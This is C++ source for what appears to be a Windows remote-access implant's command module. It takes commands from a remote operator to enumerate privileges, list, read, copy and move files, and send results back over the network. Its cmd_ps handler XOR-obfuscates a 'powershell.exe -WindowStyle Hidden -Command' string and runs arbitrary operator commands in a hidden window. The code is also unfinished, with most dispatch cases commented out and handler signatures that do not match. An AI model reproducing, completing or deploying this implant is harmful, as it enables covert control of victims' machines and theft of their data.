#include "apiFunc.hpp"
#include "commands.hpp"
#include "bytes.hpp"
#include <iostream>

#define BASE_BUFFER_SIZE 100
#define MAX_DIR_LIST_COUNT 500


typedef enum {
	TYPE_FILE,
	TYPE_DIR,
	TYPE_LINK,
};

void Commands::Dispatch(PBYTE Data, INT DataSize) {
	//printf("DEBUG: Received code = %d, CMD_CODE_GETPRIVS = %d\n", code, CMD_CODE_GETPRIVS);
	g_Bytes->Set(Data, DataSize);
	UINT ErrorCode = g_Bytes->Read4();
	if (ErrorCode > 0) {
		printf("No Command");
		return;
	}
	UINT commandID = g_Bytes->Read4();
	UINT CommandCode = g_Bytes->Read4();
	printf("code -> %d\n", CommandCode);


	/*
		TODO
			Update Handlers
			Swap all to use binary format and parse
			delete json shit
	*/

	switch (CommandCode)
	{
	/*case CMD_CODE_GETPRIVS:
		printf("Getting privs\n");
		cmd_getprivs(commandID);
		break; 
	case CMD_CODE_CD:
		cmd_changedir(commandID, Param);
		break;
	case CMD_CODE_LS:
		printf("Running LS\n");
		cmd_ls(commandID, Param);
		break;*/
	case CMD_CODE_CP:
		cmd_cp(commandID, Data);
		break;
	/*case CMD_CODE_CAT:
		cmd_cat(commandID, Param);
		break;
	case CMD_CODE_PS:
		cmd_ps(commandID, Param);
		break;*/
	default:
		break;
	}
}

void Commands::cmd_getprivs(PCHAR CommandID) {
	SIZE_T JsonSize = 0;
	PCHAR JsonString = NULL;
	CHAR TempBuffer[256];
	HANDLE hProc;
	INT finalString = 0;
	CHAR temp[512];

	PTOKEN_PRIVILEGES  pToken = NULL;
	DWORD SizeOfTokenInfo;

	PCHAR PrivilegesBuffer = AllocMemory<CHAR>(BASE_BUFFER_SIZE);
	if (!PrivilegesBuffer) {
		printf("Failed Base Allocation\n");
		return;
	}
	this->appendBufferCurrentSize = BASE_BUFFER_SIZE;
	this->appendBufferUsedSize = 0;
	
	if (!WinApis->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProc)) {
		goto CLEANUP;
	}
	
	WinApis->GetTokenInformation(hProc, TokenPrivileges, NULL, 0, &SizeOfTokenInfo);

	pToken = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SizeOfTokenInfo);
	if (pToken) {
		if (!WinApis->GetTokenInformation(hProc, TokenPrivileges, pToken, SizeOfTokenInfo, &SizeOfTokenInfo)) {
			printf("Failed Getting Token Info: 0x%d\n", GetLastError());
			goto CLEANUP;
			return;
		}
		
		for (int i = 0; i < pToken->PrivilegeCount; i++) {
			LUID_AND_ATTRIBUTES la = pToken->Privileges[i];

			
			DWORD size = sizeof(temp);
			if (WinApis->LookupPrivilegeNameA(NULL, &la.Luid, temp, &size)) {
				
				INT StrSize = snprintf(this->tempBuffer, sizeof(this->tempBuffer), "%-30s | %s", temp, (la.Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled");
				if (i == pToken->PrivilegeCount - 1) {
					finalString = 1;
				}
				Commands::AppendToBuffer(this->tempBuffer, &PrivilegesBuffer, StrSize + 1, finalString);
				
			}
		}
	}
	else {
		goto CLEANUP;
	}
	//JsonSize = CaluclateSizeOfFinalJson(strlen(PrivilegesBuffer), strlen(CommandID) + 1);
	


	if (CraftOutputJson((PCHAR)CommandID, PrivilegesBuffer, &this->HeapBuffer)) {
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		goto CLEANUP;
	}
	

CLEANUP:
	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	if (pToken) HeapFree(GetProcessHeap(), 0, pToken);
	if (JsonString) HeapFree(GetProcessHeap(), 0, JsonString);
	if (hProc) WinApis->CloseHandle(hProc);
	this->HeapBuffer = NULL;
	this->appendBufferCurrentSize = 0;
	this->appendBufferUsedSize = 0;
	return;
}


void Commands::cmd_changedir(PCHAR CommandID, PCHAR param) {

	char buffer[MAX_PATH + 64];
	if (WinApis->SetCurrentDirectoryA(param)) {

		
		if (!WinApis->GetCurrentDirectoryA(sizeof(this->tempBuffer), this->tempBuffer)) {
			snprintf(buffer, sizeof(buffer), "[!] Changed Dir But couldnt Get Name: %d\n", GetLastError());
		}
		else {
			snprintf(buffer, sizeof(buffer), "[+] Current Directory: %s", this->tempBuffer);
		}

	}
	else {
		snprintf(buffer, sizeof(buffer), "[!] Error Changing Dir: 0x%d", GetLastError());
	}

	if (CraftOutputJson(CommandID, buffer, &this->HeapBuffer)) {
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		
	}

	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	this->HeapBuffer = NULL;
	return;
}



INT GetEntryType(DWORD Attribute) {
	if (Attribute & FILE_ATTRIBUTE_DIRECTORY) 
		return TYPE_DIR;
	if (Attribute & FILE_ATTRIBUTE_REPARSE_POINT) 
		return TYPE_LINK;
	return TYPE_FILE;

}

void Commands::cmd_ls(PCHAR CommandID, PCHAR Param) {
	WIN32_FIND_DATAA FileInfo;
	PCHAR FilesBuffer = AllocMemory<CHAR>(BASE_BUFFER_SIZE);
	this->appendBufferCurrentSize = BASE_BUFFER_SIZE;
	this->appendBufferUsedSize = 0;
	char FullPath[MAX_PATH];
	
	DWORD PathSize;
	if (!(PathSize = GetFullPathNameA(Param, MAX_PATH, FullPath, NULL))) {
		return;
	}
	FullPath[PathSize] = '\\';
	FullPath[++PathSize] = '*';
	FullPath[++PathSize] = 0;


	HANDLE hFile = WinApis->FindFirstFileA(FullPath, &FileInfo);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Failed Opening\n");
		return;
	}

	

	INT Count = 0;
	do {
		if (strcmp(FileInfo.cFileName, ".") == 0 || strcmp(FileInfo.cFileName, "..") == 0) continue;

		
		INT Type = GetEntryType(FileInfo.dwFileAttributes);
		DWORD Size = ((uint64_t)FileInfo.nFileSizeHigh << 32) | FileInfo.nFileSizeLow;

		switch (Type) {
		case TYPE_FILE:
			snprintf(this->tempBuffer, sizeof(this->tempBuffer), "%-30s %-30d %-30s", FileInfo.cFileName, Size, "FILE");
			break;

		case TYPE_DIR:
			snprintf(this->tempBuffer, sizeof(this->tempBuffer), "%-30s %-30s", FileInfo.cFileName, "DIR");
			break;
		}

		if (++Count >= MAX_DIR_LIST_COUNT) {
			Commands::AppendToBuffer(this->tempBuffer, &FilesBuffer, strlen(this->tempBuffer) + 1, 0);
			snprintf(this->tempBuffer, sizeof(this->tempBuffer), "\n[Listing truncated - showing first %d files]", MAX_DIR_LIST_COUNT);
			Commands::AppendToBuffer(this->tempBuffer, &FilesBuffer, strlen(this->tempBuffer) + 1, 1);
			break;
		}
		else {
			Commands::AppendToBuffer(this->tempBuffer, &FilesBuffer, strlen(this->tempBuffer) + 1, 0);
		}
	} while (WinApis->FindNextFileA(hFile, &FileInfo));
	
	//SIZE_T JsonSize = CaluclateSizeOfFinalJson(strlen(FilesBuffer), strlen(CommandID)) + 1;
	PCHAR JsonString = NULL;

	if (CraftOutputJson(CommandID, FilesBuffer, &this->HeapBuffer)) {
		
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		goto CLEANUP;
		return;
	}


CLEANUP:
	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	if (FilesBuffer) HeapFree(GetProcessHeap(), 0, FilesBuffer);
	this->HeapBuffer = NULL;
	this->appendBufferCurrentSize = 0;
	this->appendBufferUsedSize = 0;
	return;
}



void Commands::cmd_cp(UINT CommandID, PBYTE Data) {

	BYTE src[MAX_PATH];
	BYTE dst[MAX_PATH];

	UINT srcLen = g_Bytes->Read4();
	g_Bytes->ReadBytes(src, srcLen);
	UINT dstLen = g_Bytes->Read4();
	g_Bytes->ReadBytes(dst, dstLen);
	char buf[100];
	GetCurrentDirectoryA(100, buf);
	printf("%s\n", buf);

	int OutSize;

	if (!WinApis->CopyFileA((CHAR*)src, (CHAR*)dst, FALSE)) {
		OutSize = snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[!] Error Copying: 0x%d", GetLastError());
	}
	else {
		OutSize = snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[+] copied %s to %s", src, dst);
	}


	/*
	if (CraftOutputJson(CommandID, this->tempBuffer, &this->HeapBuffer)) {
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
	}
	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);*/
	return;
}


void Commands::cmd_mv(PCHAR CommandID, PCHAR src, PCHAR dest) {
	if (!WinApis->MoveFileA(src, dest)) {
		snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[!] Failed Moving: 0x%u", GetLastError());
	} else 	snprintf(this->tempBuffer, sizeof(this->tempBuffer), "[+] Moved %s to %s", src, dest);

	if (CraftOutputJson(CommandID, this->tempBuffer, &this->HeapBuffer)) {
		printf("%s\n", this->HeapBuffer);
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		goto CLEANUP;
	}
CLEANUP:
	HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	this->HeapBuffer = NULL;
	return;
}


void Commands::cmd_cat(PCHAR commandId, PCHAR fileName) {
	HANDLE hFile = NULL;
	CHAR fileBuffer[2048];
	DWORD BytesRead = 0;

	if ((hFile = WinApis->CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		snprintf(fileBuffer, sizeof(fileBuffer), "[!] Failed Opening File: 0x%d\n", GetLastError());
		goto CLEANUP;
	}

	
	if (!WinApis->ReadFile(hFile, fileBuffer, sizeof(fileBuffer) - 1, &BytesRead, NULL)) {
		snprintf(fileBuffer, sizeof(fileBuffer), "[!] Failed Reading File: 0x%d\n", GetLastError());
	} else 
		fileBuffer[BytesRead] = '\0';

	if (CraftOutputJson(commandId, fileBuffer, &this->HeapBuffer)) {
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		goto CLEANUP;
	}


CLEANUP:
	if (hFile) WinApis->CloseHandle(hFile);
	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	this->HeapBuffer = NULL;
	return;

}


void Commands::cmd_ps(PCHAR commandId, PCHAR args) {
	HANDLE hRead, hWrite = NULL;
	SECURITY_ATTRIBUTES sa;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	WinApis->CreatePipe(&hRead, &hWrite, &sa, 0);

	SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
	STARTUPINFOA su = {};
	PROCESS_INFORMATION pi = {};

	su.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	su.cb = sizeof(STARTUPINFOA);
	su.wShowWindow = SW_HIDE;
	su.hStdOutput = hWrite;
	su.hStdError = hWrite;


	char command[1024];
	CHAR commandOutput[1024];
	DWORD bytesRead = 0;

	// powershell.exe ... xor encoded
	unsigned char powershell[] = { 0x8f, 0x90, 0x88, 0x9a, 0x8d, 0x8c, 0x97, 0x9a, 0x93, 0x93, 0xd1, 0x9a, 0x87, 0x9a, 0xdf, 0xd2, 0xb1, 0x90, 0xb3, 0x90, 0x98, 0x90, 0xdf, 0xd2, 0xb1, 0x90, 0xaf, 0x8d, 0x90, 0x99, 0x96, 0x93, 0x9a, 0xdf, 0xd2, 0xa8, 0x96, 0x91, 0x9b, 0x90, 0x88, 0xac, 0x8b, 0x86, 0x93, 0x9a, 0xdf, 0xb7, 0x96, 0x9b, 0x9b, 0x9a, 0x91, 0xdf, 0xd2, 0xbc, 0x90, 0x92, 0x92, 0x9e, 0x91, 0x9b, 0xff, 0x00 };
	XOR((PCHAR)powershell, sizeof(powershell), (PCHAR)powershell, 0xFF);
	snprintf(command, 1024, "%s %s", powershell, args);
	if (!WinApis->CreateProcessA(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &su, &pi)) {
		snprintf(commandOutput, sizeof(commandOutput), "[!] Erroring Making Pipe: 0x%u\n", GetLastError());
		goto CLEANUP;
	}	
	CloseHandle(hWrite);
	hWrite = NULL;
	WaitForSingleObject(pi.hProcess, INFINITE);

	
	memset(commandOutput, 0, sizeof(commandOutput));

	if(!WinApis->ReadFile(hRead, commandOutput, sizeof(commandOutput) - 1, &bytesRead, NULL)) {
		snprintf(commandOutput, sizeof(commandOutput), "[!] Erroring Reading output: 0x%u\n", GetLastError());
		goto CLEANUP;
	}

	if (CraftOutputJson(commandId, commandOutput, &this->HeapBuffer)) {
		g_NetworkManager->PostData((BYTE*)this->HeapBuffer, strlen(this->HeapBuffer));
		goto CLEANUP;
	}

CLEANUP:
	if (this->HeapBuffer) HeapFree(GetProcessHeap(), 0, this->HeapBuffer);
	this->HeapBuffer = NULL;
	if (hRead) WinApis->CloseHandle(hRead);
	if (hWrite) WinApis->CloseHandle(hWrite);
	return;
}



void Commands::AppendToBuffer(PCHAR TempBuffer, PCHAR* HeapBuffer, SIZE_T StringSize, BOOL Final) {
	if (!TempBuffer || !*HeapBuffer) {
		printf("not valid\n");
		return;
	}
	if (this->appendBufferUsedSize + StringSize > this->appendBufferCurrentSize) {
		SIZE_T NewSize = this->appendBufferCurrentSize * 2;
		while (NewSize < this->appendBufferUsedSize + StringSize) {
			NewSize *= 2;
		}
		PCHAR NewBuffer = (PCHAR)HeapReAlloc(GetProcessHeap(), 0, *HeapBuffer, NewSize);
		if (!NewBuffer) {
			printf("HeapReAlloc failed\n");
			return;
		}
		*HeapBuffer = NewBuffer;
		this->appendBufferCurrentSize = NewSize;
	}

	memcpy(*HeapBuffer + this->appendBufferUsedSize, TempBuffer, StringSize);
	this->appendBufferUsedSize += StringSize;

	if (!Final) {
		(*HeapBuffer)[this->appendBufferUsedSize - 1] = '\n';
	}
}



